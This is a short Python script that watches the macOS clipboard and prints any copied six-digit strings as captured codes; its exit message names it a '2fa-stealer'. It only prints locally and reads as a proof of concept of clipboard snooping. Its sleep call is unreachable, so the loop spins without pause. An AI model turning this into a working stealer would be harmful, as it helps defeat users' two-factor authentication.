#!/usr/bin/env python3

import time, re, subprocess

try:

    subprocess.run("clear")

    with open('logo.ascii') as f:
        print(f.read())

    print("waiting: ...")

    prev_buffer = subprocess.check_output("pbpaste").decode('utf-8')

    while True:

        buffer = subprocess.check_output("pbpaste").decode('utf-8')
        if buffer == prev_buffer:
            continue
            time.sleep(1)

        if re.match('[0-9]{6}', buffer):
            print("code:", buffer)
        else:
            print('other:', buffer)

        prev_buffer = buffer

except KeyboardInterrupt:
    subprocess.run("clear")
    print("2fa-stealer exiting...")

